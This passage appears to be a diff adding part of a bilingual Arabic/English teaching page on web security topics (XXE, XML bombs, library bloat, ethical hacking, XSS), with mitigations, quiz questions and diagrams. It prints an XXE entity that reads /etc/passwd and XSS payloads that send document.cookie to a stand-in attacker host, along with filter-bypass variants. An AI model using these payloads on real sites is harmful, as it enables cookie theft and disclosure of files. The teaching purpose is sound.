+      <button class="copy-btn"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+    </div>
+    <pre><code>libxml_disable_entity_loader(true);</code></pre>
+  </div>
+
+  <!-- DIAGRAM[2]: Detailed SVG generation prompt: A tree diagram showing an XML parser processing an XML document. Root element '<reminder>' branches into '<to>', '<from>', '<body>'. Show how an injected entity expands or points to an external file (like /etc/passwd). Use dark background #0d1117, node circles with blue borders, text inside. Arabic + English labels. -->
+<div class="svg-diagram" data-diagram-id="2">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 570" width="100%" height="auto" preserveAspectRatio="xMidYMid meet" font-family="system-ui, 'Cairo', 'Inter', sans-serif">
+    <defs>
+        <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+            <path d="M 0 0 L 10 5 L 0 10 z" fill="var(--brand-500)" />
+        </marker>
+        <marker id="arrow-dash" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+            <path d="M 0 0 L 10 5 L 0 10 z" fill="var(--brand-400)" />
+        </marker>
+        <linearGradient id="malicious-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="var(--brand-800)" />
+            <stop offset="100%" stop-color="var(--brand-600)" />
+        </linearGradient>
+    </defs>
+
+    <!-- Background -->
+    <rect width="100%" height="100%" fill="var(--bg-surface)" />
+
+    <!-- Diagram Title -->
+    <text x="400" y="35" text-anchor="middle" font-size="22" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">XML Parse Tree with XXE Injection</text>
+    <text x="400" y="35" text-anchor="middle" font-size="22" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">شجرة تحليل XML مع حقن كيان خارجي (XXE)</text>
+
+    <!-- Parser Memory Context Box -->
+    <rect x="260" y="55" width="520" height="370" rx="12" fill="none" stroke="var(--border-color)" stroke-width="2" stroke-dasharray="8" />
+    <text x="520" y="80" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--text-muted)" class="gsvg-en">XML Parser Memory</text>
+    <text x="520" y="80" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--text-muted)" class="gsvg-ar">ذاكرة محلل XML</text>
+
+    <!-- Malicious DTD Payload Box -->
+    <rect x="15" y="90" width="210" height="90" rx="8" fill="var(--bg-elevated)" stroke="var(--brand-400)" stroke-dasharray="4" stroke-width="2" />
+    <text x="120" y="110" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">Malicious Payload</text>
+    <text x="120" y="110" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">حمولة خبيثة</text>
+    
+    <rect x="20" y="120" width="200" height="50" rx="4" fill="var(--bg-surface)" stroke="var(--border-color)" stroke-width="1" />
+    <text x="25" y="138" font-family="monospace" font-size="11" fill="var(--text-secondary)">&lt;!ENTITY xxe SYSTEM</text>
+    <text x="25" y="158" font-family="monospace" font-size="11" fill="var(--text-secondary)"> "file:///etc/passwd"&gt;</text>
+
+    <!-- Arrow from DTD to Parser -->
+    <path d="M 225 135 L 450 135" stroke="var(--brand-400)" stroke-width="2" stroke-dasharray="4" fill="none" marker-end="url(#arrow-dash)" />
+    <text x="340" y="125" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--text-muted)" class="gsvg-en">Defines</text>
+    <text x="340" y="125" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--text-muted)" class="gsvg-ar">يُعرّف</text>
+
+    <!-- Tree Edges -->
+    <path d="M 520 160 L 340 230" stroke="var(--brand-500)" stroke-width="2" fill="none" marker-end="url(#arrow)" />
+    <path d="M 520 160 L 520 230" stroke="var(--brand-500)" stroke-width="2" fill="none" marker-end="url(#arrow)" />
+    <path d="M 520 160 L 700 230" stroke="var(--brand-500)" stroke-width="2" fill="none" marker-end="url(#arrow)" />
+
+    <path d="M 340 280 L 340 350" stroke="var(--brand-500)" stroke-width="2" fill="none" marker-end="url(#arrow)" />
+    <path d="M 520 280 L 520 350" stroke="var(--brand-500)" stroke-width="2" fill="none" marker-end="url(#arrow)" />
+    <path d="M 700 280 L 700 350" stroke="var(--brand-500)" stroke-width="2" fill="none" marker-end="url(#arrow)" />
+
+    <path d="M 700 400 L 700 460" stroke="var(--brand-400)" stroke-width="2" stroke-dasharray="6,4" fill="none" marker-end="url(#arrow-dash)" />
+
+    <!-- Tree Nodes (Level 0) -->
+    <rect x="460" y="110" width="120" height="50" rx="25" fill="var(--bg-elevated)" stroke="var(--brand-500)" stroke-width="2" />
+    <text x="520" y="140" text-anchor="middle" dominant-baseline="middle" font-family="monospace" font-size="16" font-weight="bold" fill="var(--text-primary)">&lt;reminder&gt;</text>
+
+    <!-- Tree Nodes (Level 1) -->
+    <rect x="280" y="230" width="120" height="50" rx="25" fill="var(--bg-elevated)" stroke="var(--brand-500)" stroke-width="2" />
+    <text x="340" y="260" text-anchor="middle" dominant-baseline="middle" font-family="monospace" font-size="16" font-weight="bold" fill="var(--text-primary)">&lt;to&gt;</text>
+
+    <rect x="460" y="230" width="120" height="50" rx="25" fill="var(--bg-elevated)" stroke="var(--brand-500)" stroke-width="2" />
+    <text x="520" y="260" text-anchor="middle" dominant-baseline="middle" font-family="monospace" font-size="16" font-weight="bold" fill="var(--text-primary)">&lt;from&gt;</text>
+
+    <rect x="640" y="230" width="120" height="50" rx="25" fill="var(--bg-elevated)" stroke="var(--brand-500)" stroke-width="2" />
+    <text x="700" y="260" text-anchor="middle" dominant-baseline="middle" font-family="monospace" font-size="16" font-weight="bold" fill="var(--text-primary)">&lt;body&gt;</text>
+
+    <!-- Tree Nodes (Level 2 - Values) -->
+    <rect x="280" y="350" width="120" height="50" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+    <text x="340" y="380" text-anchor="middle" dominant-baseline="middle" font-size="16" fill="var(--text-secondary)">"Alice"</text>
+
+    <rect x="460" y="350" width="120" height="50" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+    <text x="520" y="380" text-anchor="middle" dominant-baseline="middle" font-size="16" fill="var(--text-secondary)">"Bob"</text>
+
+    <!-- Malicious Injected Entity -->
+    <rect x="640" y="350" width="120" height="50" rx="8" fill="url(#malicious-grad)" stroke="var(--brand-800)" stroke-width="2" />
+    <text x="700" y="380" text-anchor="middle" dominant-baseline="middle" font-family="monospace" font-size="18" font-weight="bold" fill="var(--on-brand-hi)">&amp;xxe;</text>
+
+    <!-- Entity Resolution Label -->
+    <text x="750" y="435" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">Entity Resolution</text>
+    <text x="750" y="435" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">تحليل الكيان</text>
+
+    <!-- External File Box -->
+    <rect x="600" y="470" width="200" height="60" rx="6" fill="var(--bg-elevated)" stroke="var(--brand-500)" stroke-width="2" stroke-dasharray="4" />
+    <text x="700" y="495" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">External File Read</text>
+    <text x="700" y="495" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">قراءة ملف خارجي</text>
+    <text x="700" y="515" text-anchor="middle" font-family="monospace" font-size="14" fill="var(--text-primary)">/etc/passwd</text>
+
+    <!-- Exfiltration Warning -->
+    <text x="700" y="555" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--brand-ink-strong)" class="gsvg-en">⚠️ Sensitive Data Exfiltrated</text>
+    <text x="700" y="555" text-anchor="middle" font-size="14" font-weight="bold" fill="var(--brand-ink-strong)" class="gsvg-ar">⚠️ تسريب بيانات حساسة</text>
+
+</svg>
+</div>
+
+  <table class="comparison-table">
+    <thead><tr><th></th><th>XML Bomb</th><th>XXE Disclosure</th></tr></thead>
+    <tbody>
+      <tr>
+        <td data-bilingual>
+          <template class="content-ar">الهدف الأساسي</template>
+          <template class="content-en">Primary Goal</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-bad" data-bilingual>
+          <template class="content-ar">حجب الخدمة (تعطل التطبيق)</template>
+          <template class="content-en">Denial of Service (Crash application)</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-bad" data-bilingual>
+          <template class="content-ar">تسريب معلومات حساسة</template>
+          <template class="content-en">Leak sensitive information</template>
+          <span class="content-target"></span>
+        </td>
+      </tr>
+      <tr>
+        <td data-bilingual>
+          <template class="content-ar">طريقة التخفيف</template>
+          <template class="content-en">Mitigation Method</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-good" data-bilingual>
+          <template class="content-ar">تعطيل التوسع المضمن للكيانات</template>
+          <template class="content-en">Disable inline expansion of entities</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-good" data-bilingual>
+          <template class="content-ar">تجنب حل المراجع الخارجية</template>
+          <template class="content-en">Avoid resolving external references</template>
+          <span class="content-target"></span>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+
+  <details class="thinking-question">
+    <summary data-bilingual>
+      <template class="content-ar">كيف يختلف تأثير قنبلة XML عن تأثير هجوم XXE؟</template>
+      <template class="content-en">How does the impact of an XML Bomb differ from an XXE attack?</template>
+      <span class="content-target"></span>
+    </summary>
+    <div data-bilingual>
+      <template class="content-ar"><p>قنبلة XML تهدف إلى استنفاد الموارد (حجب الخدمة - DoS) عن طريق التوسع الأسي، بينما يهدف XXE إلى سرقة المعلومات الحساسة أو الوصول إلى ملفات النظام عن طريق قراءة المراجع الخارجية.</p></template>
+      <template class="content-en"><p>An XML Bomb aims for resource exhaustion (Denial of Service - DoS) via exponential expansion, whereas XXE aims to steal sensitive information or access system files by reading external references.</p></template>
+      <div class="content-target"></div>
+    </div>
+  </details>
+</section>
+
+<section id="library-bloat" class="concept-card glass-card fade-up">
+  <div class="concept-header" data-bilingual>
+    <template class="content-ar"><h2><span class="concept-number">3</span> تضخم المكتبات (Library Bloat)</h2></template>
+    <template class="content-en"><h2><span class="concept-number">3</span> Library Bloat</h2></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="depth-tabs">
+    <button class="depth-tab active" data-layer="flash"><i class="fa-solid fa-bolt" aria-hidden="true"></i> <span data-i18n="layer.flash">سريع</span></button>
+    <button class="depth-tab" data-layer="full"><i class="fa-solid fa-book-open" aria-hidden="true"></i> <span data-i18n="layer.full">كامل</span></button>
+    <button class="depth-tab" data-layer="deep"><i class="fa-solid fa-microscope" aria-hidden="true"></i> <span data-i18n="layer.deep">عميق</span></button>
+  </div>
+
+  <div class="depth-layer active" data-layer="flash" data-bilingual>
+    <template class="content-ar"><p>يشير إلى المكتبات التي يتم الإعلان عنها أو استخدامها في البرنامج النصي للبناء بينما لا تكون ضرورية لتنفيذ التطبيق.</p><p><b>تشبيه:</b> كأن تحمل حقيبة سفر مليئة بمعدات التزلج وأنت ذاهب إلى رحلة في الصحراء؛ إنها تزيد الوزن بلا فائدة.</p></template>
+    <template class="content-en"><p>Refers to libraries that are declared or used in the build script while they are not necessary for executing the software application.</p><p><b>Analogy:</b> Like packing a suitcase full of ski gear for a trip to the desert; it adds dead weight for no reason.</p></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="full" data-bilingual>
+    <template class="content-ar"><p><b>تضخم المكتبات (Library Bloat):</b> يحدث عندما يتضمن التطبيق مكتبات برمجية لا يحتاجها فعلياً للعمل، مما يزيد من حجم التطبيق وتعقيده.</p><p><b><span class="smart-term" data-term-en="Code Bloat" data-ar="تضخم الكود" data-en-def="Production of code that is unnecessarily long, slow, or wasteful of resources.">تضخم الكود<span class="smart-term-tooltip"></span></span> (Code Bloat):</b> هو إنتاج كود يُنظر إليه على أنه طويل بشكل غير ضروري، أو بطيء، أو يهدر الموارد. إنها مشكلة في تطوير البرمجيات تجعل طول كود البرنامج طويلاً بلا داعٍ.</p></template>
+    <template class="content-en"><ul><li><b>Library Bloat:</b> Occurs when libraries are declared or used in the build script but are not necessary for executing the software application.</li><li><b><span class="smart-term" data-term-en="Code Bloat" data-ar="تضخم الكود" data-en-def="Production of code that is unnecessarily long, slow, or wasteful of resources.">Code Bloat<span class="smart-term-tooltip"></span></span>:</b> Is the production of code that is perceived as unnecessarily long, slow, or otherwise wasteful of resources. It is a problem in Software Development which makes the length of the code unnecessarily long.</li></ul></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="deep" data-bilingual>
+    <template class="content-ar"><p>من منظور أمني، تضخم المكتبات ليس مجرد مشكلة في الأداء أو استهلاك مساحة التخزين؛ بل إنه يوسع مساحة الهجوم (Attack Surface). كل مكتبة إضافية غير مستخدمة قد تحتوي على ثغرات أمنية (مثل CVEs) يمكن للمهاجمين استغلالها، حتى لو لم يكن التطبيق الأساسي يستخدم تلك الوظائف المعيبة.</p><p>تتطلب إدارة التبعيات (Dependency Management) الحديثة أدوات لتحليل وإزالة المكتبات غير المستخدمة (Tree Shaking) لتقليل المخاطر الأمنية وتحسين كفاءة التطبيق.</p></template>
+    <template class="content-en"><p>From a security perspective, library bloat is not just a performance or storage issue; it expands the application's Attack Surface. Every additional, unused library might contain vulnerabilities (CVEs) that attackers could exploit, even if the core application doesn't actively use the flawed functions.</p><p>Modern dependency management requires tools to analyze and remove unused libraries (Tree Shaking) to mitigate security risks and improve application efficiency.</p></template>
+    <div class="content-target"></div>
+  </div>
+
+  <details class="thinking-question">
+    <summary data-bilingual>
+      <template class="content-ar">لماذا يعتبر تضخم المكتبات خطراً أمنياً وليس مجرد مشكلة في الأداء؟</template>
+      <template class="content-en">Why is library bloat considered a security risk and not just a performance issue?</template>
+      <span class="content-target"></span>
+    </summary>
+    <div data-bilingual>
+      <template class="content-ar"><p>لأن كل مكتبة إضافية تزيد من مساحة الهجوم؛ فقد تحتوي المكتبات غير المستخدمة على ثغرات أمنية يمكن استغلالها لاختراق التطبيق.</p></template>
+      <template class="content-en"><p>Because every additional library increases the attack surface; unused libraries may contain vulnerabilities that can be exploited to compromise the application.</p></template>
+      <div class="content-target"></div>
+    </div>
+  </details>
+</section>
+
+<section id="ethical-hacking" class="concept-card glass-card fade-up">
+  <div class="concept-header" data-bilingual>
+    <template class="content-ar"><h2><span class="concept-number">4</span> الاختراق الأخلاقي (Ethical Hacking)</h2></template>
+    <template class="content-en"><h2><span class="concept-number">4</span> Ethical Hacking</h2></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="depth-tabs">
+    <button class="depth-tab active" data-layer="flash"><i class="fa-solid fa-bolt" aria-hidden="true"></i> <span data-i18n="layer.flash">سريع</span></button>
+    <button class="depth-tab" data-layer="full"><i class="fa-solid fa-book-open" aria-hidden="true"></i> <span data-i18n="layer.full">كامل</span></button>
+    <button class="depth-tab" data-layer="deep"><i class="fa-solid fa-microscope" aria-hidden="true"></i> <span data-i18n="layer.deep">عميق</span></button>
+  </div>
+
+  <div class="depth-layer active" data-layer="flash" data-bilingual>
+    <template class="content-ar"><p>يُعرف أيضاً باختبار الاختراق، وهو استخدام نفس أدوات وتقنيات القراصنة ولكن بشكل قانوني وبإذن لتقييم أمن الأنظمة.</p><p><b>تشبيه:</b> توظيف خبير أقفال لمحاولة فتح خزنتك لمعرفة نقاط ضعفها قبل أن يحاول لص حقيقي ذلك.</p></template>
+    <template class="content-en"><p>Also known as penetration testing, it involves using the same tools and techniques as hackers, but legally and with permission to evaluate system security.</p><p><b>Analogy:</b> Hiring a master locksmith to try and pick your safe to find its weaknesses before a real thief tries.</p></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="full" data-bilingual>
+    <template class="content-ar"><p>الاختراق الأخلاقي (أو <span class="smart-term" data-term-en="White-hat hacking" data-ar="اختراق القبعة البيضاء" data-en-def="Another term for ethical hacking, focusing on improving security legally.">اختراق القبعة البيضاء<span class="smart-term-tooltip"></span></span> - White-hat hacking) يتضمن محترفين مستقلين في أمن الحواسيب يقتحمون أنظمة الكمبيوتر.</p><p><b>الخصائص الرئيسية:</b></p><ul><li><b>القانونية:</b> الفرق الرئيسي هو أن الاختراق الأخلاقي قانوني تماماً.</li><li><b>عدم الإضرار:</b> لا يقومون بإتلاف الأنظمة المستهدفة ولا يسرقون المعلومات.</li><li><b>التقييم والإبلاغ:</b> يقومون بتقييم أمن الأنظمة المستهدفة وإبلاغ المالكين بالثغرات (Bugs) التي تم العثور عليها.</li></ul></template>
+    <template class="content-en"><p>Ethical hacking (or <span class="smart-term" data-term-en="White-hat hacking" data-ar="اختراق القبعة البيضاء" data-en-def="Another term for ethical hacking, focusing on improving security legally.">white-hat hacking<span class="smart-term-tooltip"></span></span>) involves independent computer security professionals breaking into computer systems.</p><p><b>Key Characteristics:</b></p><ul><li><b>Legality:</b> The one major difference is that Ethical hacking is legal.</li><li><b>No Damage:</b> They neither damage the target systems nor steal information.</li><li><b>Evaluate and Report:</b> They evaluate target systems security and report back to owners about the bugs found.</li></ul></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="deep" data-bilingual>
+    <template class="content-ar"><p>الخط الفاصل بين الاختراق الأخلاقي والاختراق الخبيث هو <b>التفويض (Authorization)</b> و <b>النطاق (Scope)</b>. يجب أن يعمل المخترق الأخلاقي ضمن حدود صارمة يحددها العميل (قواعد الاشتباك).</p><p>الهدف ليس فقط العثور على الثغرات، بل تقديم مسار واضح للإصلاح (Remediation). يعتمد هذا المجال بشكل كبير على الثقة والالتزام الصارم بالسرية، حيث يطلع المختبرون على بيانات وأنظمة حساسة للغاية.</p></template>
+    <template class="content-en"><p>The dividing line between ethical and malicious hacking is <b>Authorization</b> and <b>Scope</b>. An ethical hacker must operate strictly within the boundaries defined by the client (Rules of Engagement).</p><p>The goal is not just to find vulnerabilities, but to provide a clear path for remediation. This field relies heavily on trust and strict adherence to confidentiality, as testers are exposed to highly sensitive data and systems.</p></template>
+    <div class="content-target"></div>
+  </div>
+
+  <details class="thinking-question">
+    <summary data-bilingual>
+      <template class="content-ar">ما هو الشرط الأساسي الذي يجعل عملية الاختراق 'أخلاقية' وقانونية؟</template>
+      <template class="content-en">What is the primary condition that makes a hacking activity 'ethical' and legal?</template>
+      <span class="content-target"></span>
+    </summary>
+    <div data-bilingual>
+      <template class="content-ar"><p>الحصول على إذن وتفويض مسبق وصريح من مالك النظام المستهدف، وعدم إحداث ضرر أو سرقة بيانات.</p></template>
+      <template class="content-en"><p>Obtaining prior, explicit permission and authorization from the owner of the target system, and causing no damage or data theft.</p></template>
+      <div class="content-target"></div>
+    </div>
+  </details>
+</section>
+
+<section id="cross-site-scripting" class="concept-card glass-card fade-up">
+  <div class="concept-header" data-bilingual>
+    <template class="content-ar"><h2><span class="concept-number">5</span> البرمجة عبر المواقع (Cross Site Scripting - XSS/CSS)</h2></template>
+    <template class="content-en"><h2><span class="concept-number">5</span> Cross Site Scripting (XSS/CSS)</h2></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="depth-tabs">
+    <button class="depth-tab active" data-layer="flash"><i class="fa-solid fa-bolt" aria-hidden="true"></i> <span data-i18n="layer.flash">سريع</span></button>
+    <button class="depth-tab" data-layer="full"><i class="fa-solid fa-book-open" aria-hidden="true"></i> <span data-i18n="layer.full">كامل</span></button>
+    <button class="depth-tab" data-layer="deep"><i class="fa-solid fa-microscope" aria-hidden="true"></i> <span data-i18n="layer.deep">عميق</span></button>
+  </div>
+
+  <div class="depth-layer active" data-layer="flash" data-bilingual>
+    <template class="content-ar"><p>هجوم على مستوى التطبيق حيث يقوم المهاجم بحقن نصوص برمجية خبيثة في صفحات الويب التي يعرضها مستخدمون آخرون.</p><p><b>تشبيه:</b> كأن يضع شخص إعلاناً مزيفاً على لوحة إعلانات موثوقة في الجامعة، وكل من يقرأ الإعلان يتم خداعه لإعطاء معلوماته.</p></template>
+    <template class="content-en"><p>An application-level attack where an attacker injects malicious scripts into web pages viewed by other users.</p><p><b>Analogy:</b> Like someone placing a fake, malicious notice on a trusted university bulletin board, tricking anyone who reads it into giving up their info.</p></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="full" data-bilingual>
+    <template class="content-ar"><p>البرمجة عبر المواقع (يشار إليها أحياناً بـ CSS أو XSS) هي هجوم على خصوصية العملاء يمكن أن يؤدي إلى خرق كامل للأمن عند سرقة تفاصيل العملاء. على عكس معظم الهجمات، يشمل XSS ثلاثة أطراف: المهاجم، العميل (الضحية)، وموقع الويب.</p><p><b>التقنية:</b> يكمن جوهر الهجوم في برنامج نصي ضعيف في الموقع يقرأ جزءاً من طلب HTTP (المعلمات، الرؤوس، أو المسار) ويعكسه مرة أخرى في صفحة الاستجابة دون تعقيمه (Sanitizing) من علامات HTML أو كود Javascript.</p><p><b>مثال على رابط خبيث:</b><br><code>http://www.vulnerable.site/welcome.cgi?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><b>النطاق والجدوى:</b></p><ul><li>يحدث الهجوم فقط في متصفح الضحية.</li><li>يجب على المهاجم إجبار العميل على الوصول إلى الرابط الخبيث (عبر البريد الإلكتروني أو زيارة موقع آخر).</li><li>يمكن للكود الخبيث الوصول إلى ملفات تعريف الارتباط الدائمة (Permanent cookies) وملفات تعريف الارتباط في الذاكرة (RAM cookies) الخاصة بالموقع الضعيف.</li></ul><p><b>تأمين الموقع ضد XSS:</b></p><ol><li><b>تصفية المدخلات (Input Filtering/Sanitation):</b> تصفية مدخلات المستخدم ضد علامات HTML وكود Javascript قبل معالجتها.</li><li><b><span class="smart-term" data-term-en="Output Filtering" data-ar="تصفية المخرجات" data-en-def="Filtering data just before it is rendered in the browser to prevent script execution.">تصفية المخرجات<span class="smart-term-tooltip"></span></span> (Output Filtering):</b> تصفية بيانات المستخدم عند إرسالها مرة أخرى إلى المتصفح (مهم عند عرض بيانات من قاعدة البيانات).</li><li><b>جدار حماية تطبيقات الويب (Application Firewall):</b> يعترض هجمات XSS قبل وصولها إلى خادم الويب عن طريق فحص البيانات بحثاً عن أنماط HTML و Javascript الخبيثة.</li></ol></template>
+    <template class="content-en"><p>Cross Site Scripting (CSS or XSS) is an attack on the privacy of clients that can lead to a total breach of security when customer details are stolen. Unlike most attacks, XSS involves three parties: the attacker, a client (victim), and the web site.</p><p><b>The Technique:</b> At the core lies a vulnerable script in the site that reads part of the HTTP request (parameters, headers, or path) and echoes it back to the response page without first sanitizing it (removing HTML/Javascript tags).</p><p><b>Malicious Link Example:</b><br><code>http://www.vulnerable.site/welcome.cgi?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><b>Scope and Feasibility:</b></p><ul><li>The attack takes place only at the victim's browser.</li><li>The attacker needs to force the client to access the malicious link (via email or visiting another site).</li><li>The malicious Javascript can access permanent cookies and RAM cookies of the vulnerable site.</li></ul><p><b>Securing against XSS:</b></p><ol><li><b>Input Filtering (Sanitation):</b> Filtering user input against HTML tags and Javascript code before processing.</li><li><b><span class="smart-term" data-term-en="Output Filtering" data-ar="تصفية المخرجات" data-en-def="Filtering data just before it is rendered in the browser to prevent script execution.">Output Filtering<span class="smart-term-tooltip"></span></span>:</b> Filtering user data when it is sent back to the browser (important for data retrieved from a DB).</li><li><b>Application Firewall:</b> Intercepts XSS attacks before they reach the web server by inspecting data against HTML and Javascript patterns.</li></ol></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="deep" data-bilingual>
+    <template class="content-ar"><p>تكمن خطورة XSS في استغلال الثقة التي يضعها متصفح المستخدم في الموقع الذي يزوره. المتصفح لا يملك طريقة لمعرفة أن البرنامج النصي (Script) لم يكن من المفترض أن يكون جزءاً من الصفحة الأصلية، فيقوم بتنفيذه.</p><p>هناك طرق مختلفة لتنفيذ الهجوم لتجاوز الفلاتر البسيطة، مثل:</p><ul><li>استخدام علامة <code>&lt;img src="javascript:..."&gt;</code> بدلاً من <code>&lt;script&gt;</code>، أو</li><li>الهروب من سياق HTML غير الحر (مثل إغلاق علامة <code>&lt;input&gt;</code> أولاً باستخدام <code>"&gt;</code> ثم حقن الكود).</li></ul><p>يمكن أيضاً تنفيذ الهجوم عبر:</p><ul><li>طلبات POST، أو</li><li>مكون المسار (Path) في طلب HTTP، أو</li><li>حتى رؤوس HTTP مثل (Referer)،</li></ul><p>مما يجعل الاعتماد على تصفية معلمات GET فقط غير كافٍ.</p></template>
+    <template class="content-en"><p>The danger of XSS lies in exploiting the trust a user's browser has in the site they are visiting. The browser has no way to know that the script was not intended to be part of the original page, so it executes it.</p><p>Attackers use variations to bypass simple filters, such as:</p><ul><li>using the <code>&lt;img src="javascript:..."&gt;</code> tag instead of <code>&lt;script&gt;</code>, or</li><li>escaping from a non-free HTML context (e.g., closing an <code>&lt;input&gt;</code> tag first with <code>"&gt;</code> and then injecting the script).</li></ul><p>The attack can also be carried out via:</p><ul><li>POST requests,</li><li>the path component of the HTTP request, or</li><li>even HTTP headers like the Referer,</li></ul><p>making reliance solely on GET parameter filtering insufficient.</p></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <span>html</span>
+      <button class="copy-btn"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+    </div>
+    <pre><code>&lt;script&gt;window.open("http://www.attacker.site/collect.cgi?cookie="+document.cookie)&lt;/script&gt;</code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <span>html</span>
+      <button class="copy-btn"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+    </div>
+    <pre><code>"&gt;&lt;script&gt;window.open("http://www.attacker.site/collect.cgi?cookie="+document.cookie)&lt;/script&gt;</code></pre>
+  </div>
+
+  <!-- DIAGRAM[3]: Detailed SVG generation prompt: A diagram showing the 3 parties in an XSS attack: Attacker, Victim (Client), and Vulnerable Website. 1. Attacker sends malicious link to Victim. 2. Victim clicks link, sending request to Website. 3. Website reflects the malicious script back to Victim's browser. 4. Victim's browser executes script and sends cookies to Attacker. Use dark background #0d1117, distinct colors for each party. Arabic + English labels. -->
+<div class="svg-diagram" data-diagram-id="3">
+<svg viewBox="0 0 800 480" width="100%" height="auto" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">
+  <!-- Background -->
+  <rect width="100%" height="100%" fill="var(--bg-surface)" />
+
+  <!-- Definitions for Arrowheads -->
+  <defs>
+    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M 0 1 L 10 5 L 0 9 z" fill="var(--brand-500)" />
+    </marker>
+    <marker id="arrow-dashed" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M 0 1 L 10 5 L 0 9 z" fill="var(--brand-400)" />
+    </marker>
+  </defs>
+
+  <!-- Title -->
+  <text x="400" y="40" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="22" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Cross-Site Scripting (XSS) Attack Flow</text>
+  <text x="400" y="40" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="22" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">مسار هجوم البرمجة عبر المواقع (XSS)</text>
+
+  <!-- Connection Paths (Arrows) -->
+  <!-- Step 1: Attacker to Victim -->
+  <path d="M 185 210 Q 255 130 325 210" fill="none" stroke="var(--brand-500)" stroke-width="2" marker-end="url(#arrow)" />
+  
+  <!-- Step 2: Victim to Website -->
+  <path d="M 475 210 Q 545 130 615 210" fill="none" stroke="var(--brand-500)" stroke-width="2" marker-end="url(#arrow)" />
+  
+  <!-- Step 3: Website to Victim -->
+  <path d="M 615 260 Q 545 340 475 260" fill="none" stroke="var(--brand-500)" stroke-width="2" marker-end="url(#arrow)" />
+  
+  <!-- Step 4: Victim to Attacker (Hidden/Background Request) -->
+  <path d="M 325 260 Q 255 340 185 260" fill="none" stroke="var(--brand-400)" stroke-width="2" stroke-dasharray="6,4" marker-end="url(#arrow-dashed)" />
+
+  <!-- Nodes -->
+  <!-- Attacker Node -->
+  <rect x="40" y="175" width="140" height="110" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+  <!-- Attacker Icon (Laptop) -->
+  <rect x="85" y="195" width="50" height="30" rx="3" fill="none" stroke="var(--text-primary)" stroke-width="2" />
+  <path d="M 75 225 L 145 225 L 150 230 L 70 230 Z" fill="var(--text-primary)" />
+  <circle cx="110" cy="210" r="4" fill="var(--brand-500)" />
+  <!-- Attacker Label -->
+  <text x="110" y="265" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="15" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Attacker</text>
+  <text x="110" y="265" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="15" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">المهاجم</text>
+
+  <!-- Victim Node -->
+  <rect x="330" y="175" width="140" height="110" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+  <!-- Victim Icon (Browser) -->
+  <rect x="375" y="195" width="50" height="35" rx="3" fill="none" stroke="var(--text-primary)" stroke-width="2" />
+  <line x1="375" y1="205" x2="425" y2="205" stroke="var(--text-primary)" stroke-width="2" />
+  <circle cx="382" cy="200" r="1.5" fill="var(--text-primary)" />
+  <circle cx="387" cy="200" r="1.5" fill="var(--text-primary)" />
+  <!-- Victim Label -->
